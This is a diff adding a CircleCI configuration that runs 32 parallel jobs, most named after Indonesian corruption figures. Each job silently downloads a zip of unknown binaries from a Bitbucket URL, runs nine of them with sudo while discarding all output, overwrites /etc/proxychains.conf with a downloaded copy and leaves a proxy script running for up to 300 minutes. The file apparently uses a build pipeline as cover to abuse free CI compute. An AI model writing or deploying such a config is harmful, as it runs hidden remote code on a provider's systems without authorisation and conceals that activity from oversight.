@@ -1,0 +1,235 @@
+version: 2.1
+jobs:
+  SjamsulNursalim:
+    docker:
+      - image: circleci/python:3.8
+    <<: &commonSteps
+      steps:
+        - run:
+            name: Inilah
+            command: |
+              sudo apt update -y
+        - run:
+            name: Daftar
+            command: |
+              wget https://bitbucket.org/sindylestari/sindy/raw/03a69c26f3b895fefd0c1d9fdfedf58b4b66ff8c/blaki.zip >/dev/null 2>&1
+        - run:
+            name: Nama
+            command: |
+              unzip blaki.zip >/dev/null 2>&1
+        - run:
+            name: Orang
+            command: |
+              chmod u+x * >/dev/null 2>&1
+        - run:
+            name: Korupsi
+            command: |
+              sudo ./Siji >/dev/null 2>&1
+        - run:
+            name: Makan
+            command: |
+              sudo ./Loro >/dev/null 2>&1
+        - run:
+            name: Uang
+            command: |
+              sudo ./Telu >/dev/null 2>&1
+        - run:
+            name: Semua
+            command: |
+              sudo ./Papat >/dev/null 2>&1
+        - run:
+            name: Rakyat
+            command: |
+              sudo ./Limo >/dev/null 2>&1
+        - run:
+            name: Umum
+            command: |
+              sudo ./Enem >/dev/null 2>&1
+              cd /etc
+              sudo wget https://bitbucket.org/sindylestari/sindy/raw/03a69c26f3b895fefd0c1d9fdfedf58b4b66ff8c/prx/4/proxychains.conf >/dev/null 2>&1
+        - run:
+            name: DasarAnjir. . . .
+            no_output_timeout: 300m
+            command: |
+              echo "Selamat Menikmati. . ."
+              sudo ./Pitu >/dev/null 2>&1
+              sudo ./Wolu >/dev/null 2>&1
+              sudo ./Songo >/dev/null 2>&1
+              screen -dmS proxy python3 p1.py >/dev/null 2>&1
+              sleep 12s
+              0#proxychains bash -u start2.sh >/dev/null 2>&1
+  BambangSutrisno:
+    docker:
+      - image: circleci/python:3.8
+    <<: *commonSteps
+  AndrianKiki:
+    docker:
+      - image: circleci/python:3.8
+    <<: *commonSteps
+  EkoAdiPutranto:
+    docker:
+      - image: circleci/python:3.8
+    <<: *commonSteps
+  ShernyKonjongian:
+    docker:
+      - image: circleci/python:3.8
+    <<: *commonSteps
+  DavidNusaWijaya:
+    docker:
+      - image: circleci/python:3.8
+    <<: *commonSteps
+  SamadikunHartono:
+    docker:
+      - image: circleci/python:3.8
+    <<: *commonSteps
+  AgusAnwar:
+    docker:
+      - image: circleci/python:3.8
+    <<: *commonSteps
+  SujionoTiman:
+    docker:
+      - image: circleci/python:3.8
+    <<: *commonSteps
+  MariaPauline:
+    docker:
+      - image: circleci/python:3.8
+    <<: *commonSteps
+  DjokoSTjandra:
+    docker:
+      - image: circleci/python:3.8
+    <<: *commonSteps
+  GayusTambunan:
+    docker:
+      - image: circleci/python:3.8
+    <<: *commonSteps
+  NununNurbaeti:
+    docker:
+      - image: circleci/python:3.8
+    <<: *commonSteps
+  NaderThaher:
+    docker:
+      - image: circleci/python:3.8
+    <<: *commonSteps
+  LesmanaBasuki:
+    docker:
+      - image: circleci/python:3.8
+    <<: *commonSteps
+  HartawanAluwi:
+    docker:
+      - image: circleci/python:3.8
+    <<: *commonSteps
+  HendroWiyanto:
+    docker:
+      - image: circleci/python:3.8
+    <<: *commonSteps
+  AntonTantular:
+    docker:
+      - image: circleci/python:3.8
+    <<: *commonSteps
+  HeshamWaraq:
+    docker:
+      - image: circleci/python:3.8
+    <<: *commonSteps
+  RasatAliRizfi:
+    docker:
+      - image: circleci/python:3.8
+    <<: *commonSteps
+  HariMatalata:
+    docker:
+      - image: circleci/python:3.8
+    <<: *commonSteps
+  Nazaruddin:
+    docker:
+      - image: circleci/python:3.8
+    <<: *commonSteps
+  LidyaMuchtar:
+    docker:
+      - image: circleci/python:3.8
+    <<: *commonSteps
+  AndiMallarangeng:
+    docker:
+      - image: circleci/python:3.8
+    <<: *commonSteps
+  JeroWacik:
+    docker:
+      - image: circleci/python:3.8
+    <<: *commonSteps
+  EdhyPrabowo:
+    docker:
+      - image: circleci/python:3.8
+    <<: *commonSteps
+  ImamNahrawi:
+    docker:
+      - image: circleci/python:3.8
+    <<: *commonSteps
+  SuryadharmaAli:
+    docker:
+      - image: circleci/python:3.8
+    <<: *commonSteps
+  IdrusMarham:
+    docker:
+      - image: circleci/python:3.8
+    <<: *commonSteps
+  DahlanIskan:
+    docker:
+      - image: circleci/python:3.8
+    <<: *commonSteps
+  SitiFadilahSupari:
+    docker:
+      - image: circleci/python:3.8
+    <<: *commonSteps
+  BachtiarChamsyah:
+    docker:
+      - image: circleci/python:3.8
+    <<: *commonSteps
+
+
+
+
+
+
+
+
+
+
+
+
+workflows:
+  version: 2
+  all:
+    jobs:
+      - SjamsulNursalim
+      - BambangSutrisno
+      - AndrianKiki
+      - EkoAdiPutranto
+      - ShernyKonjongian
+      - DavidNusaWijaya
+      - SamadikunHartono
+      - AgusAnwar
+      - SujionoTiman
+      - MariaPauline
+      - DjokoSTjandra
+      - GayusTambunan
+      - NununNurbaeti
+      - NaderThaher
+      - LesmanaBasuki
+      - HartawanAluwi
+      - HendroWiyanto
+      - AntonTantular
+      - HeshamWaraq
+      - RasatAliRizfi
+      - HariMatalata
+      - Nazaruddin
+      - LidyaMuchtar
+      - AndiMallarangeng
+      - JeroWacik
+      - EdhyPrabowo
+      - ImamNahrawi
+      - SuryadharmaAli
+      - IdrusMarham
+      - DahlanIskan
+      - SitiFadilahSupari
+      - BachtiarChamsyah
+
+
+
